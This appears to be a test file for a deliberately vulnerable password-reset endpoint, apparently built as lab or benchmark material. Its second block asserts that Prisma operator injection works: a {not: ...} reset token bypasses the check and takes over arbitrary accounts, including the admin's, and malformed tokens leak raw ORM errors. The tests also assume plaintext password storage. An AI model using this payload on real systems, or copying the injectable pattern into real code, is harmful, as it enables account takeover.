const request = require('supertest')
const { newTestApp, registerUser, loginUser, ADMIN_EMAIL } = require('./helpers')

describe('reset-password request/confirm, correct-usage path', () => {
  test('requesting a reset rotates the token and never discloses it', async () => {
    const { app, prisma } = await newTestApp()
    await registerUser(app, { email: 'frank@test.local' })
    const before = await prisma.user.findUnique({ where: { email: 'frank@test.local' } })

    const res = await request(app).post('/reset-password').send({ email: 'frank@test.local' })
    expect(res.status).toBe(200)
    expect(JSON.stringify(res.body)).not.toContain(before.resetToken)

    const after = await prisma.user.findUnique({ where: { email: 'frank@test.local' } })
    expect(after.resetToken).not.toBe(before.resetToken)
    expect(after.resetToken.length).toBeGreaterThan(0)
  })

  test('requesting a reset for an unknown email responds identically (no enumeration)', async () => {
    const { app } = await newTestApp()
    const known = await request(app).post('/reset-password').send({ email: 'ghost@test.local' })
    expect(known.status).toBe(200)
  })

  test('confirming with the correct current token succeeds and rotates it again', async () => {
    const { app, prisma } = await newTestApp()
    await registerUser(app, { email: 'grace@test.local' })
    const user = await prisma.user.findUnique({ where: { email: 'grace@test.local' } })

    const res = await request(app)
      .post('/reset-password/confirm')
      .send({ email: 'grace@test.local', resetToken: user.resetToken, newPassword: 'newpw456' })
    expect(res.status).toBe(200)

    const after = await prisma.user.findUnique({ where: { email: 'grace@test.local' } })
    expect(after.password).toBe('newpw456')
    expect(after.resetToken).not.toBe(user.resetToken)

    const login = await loginUser(app, 'grace@test.local', 'newpw456')
    expect(login.status).toBe(200)
  })

  test('confirming with a wrong plain-string token is rejected', async () => {
    const { app } = await newTestApp()
    await registerUser(app, { email: 'henry@test.local' })
    const res = await request(app)
      .post('/reset-password/confirm')
      .send({ email: 'henry@test.local', resetToken: 'definitely-not-it', newPassword: 'x' })
    expect(res.status).toBe(401)
  })

  test('confirming with resetToken omitted entirely is rejected, not treated as a match', async () => {
    const { app } = await newTestApp()
    await registerUser(app, { email: 'iris@test.local' })
    const res = await request(app)
      .post('/reset-password/confirm')
      .send({ email: 'iris@test.local', newPassword: 'x' })
    expect(res.status).toBe(400)
  })
})

describe('the injection itself', () => {
  test('a malformed (numeric) resetToken leaks a raw PrismaClientValidationError', async () => {
    const { app } = await newTestApp()
    await registerUser(app, { email: 'jack@test.local' })
    const res = await request(app)
      .post('/reset-password/confirm')
      .send({ email: 'jack@test.local', resetToken: 12345, newPassword: 'x' })
    expect(res.status).toBe(500)
    expect(res.body.error).toContain('PrismaClientValidationError')
  })

  test('a malformed (array) resetToken also leaks a raw PrismaClientValidationError', async () => {
    const { app } = await newTestApp()
    await registerUser(app, { email: 'karen@test.local' })
    const res = await request(app)
      .post('/reset-password/confirm')
      .send({ email: 'karen@test.local', resetToken: ['a', 'b'], newPassword: 'x' })
    expect(res.status).toBe(500)
    expect(res.body.error).toContain('PrismaClientValidationError')
  })

  test('a structured {not: ...} resetToken bypasses the check without ever learning the real value, for the caller\'s own account', async () => {
    const { app, prisma } = await newTestApp()
    await registerUser(app, { email: 'liam@test.local', password: 'orig' })
    const before = await prisma.user.findUnique({ where: { email: 'liam@test.local' } })

    const res = await request(app)
      .post('/reset-password/confirm')
      .send({
        email: 'liam@test.local',
        resetToken: { not: 'a-guess-that-is-definitely-wrong' },
        newPassword: 'bypassed-pw',
      })
    expect(res.status).toBe(200)

    const after = await prisma.user.findUnique({ where: { email: 'liam@test.local' } })
    expect(after.password).toBe('bypassed-pw')
    expect(before.resetToken).not.toBe('a-guess-that-is-definitely-wrong')

    const login = await loginUser(app, 'liam@test.local', 'bypassed-pw')
    expect(login.status).toBe(200)
  })

  test('the identical technique also compromises an arbitrary second account, including the admin', async () => {
    const { app, prisma } = await newTestApp()

    const res = await request(app)
      .post('/reset-password/confirm')
      .send({
        email: ADMIN_EMAIL,
        resetToken: { not: 'a-guess-that-is-definitely-wrong' },
        newPassword: 'admin-bypassed-pw',
      })
    expect(res.status).toBe(200)

    const admin = await prisma.user.findUnique({ where: { email: ADMIN_EMAIL } })
    expect(admin.password).toBe('admin-bypassed-pw')

    const login = await loginUser(app, ADMIN_EMAIL, 'admin-bypassed-pw')
    expect(login.status).toBe(200)
  })

  test('a structured filter that legitimately matches nothing still returns 401, not a crash', async () => {
    const { app } = await newTestApp()
    const res = await request(app)
      .post('/reset-password/confirm')
      .send({ email: 'nobody@test.local', resetToken: { not: 'anything' }, newPassword: 'x' })
    expect(res.status).toBe(401)
  })
})
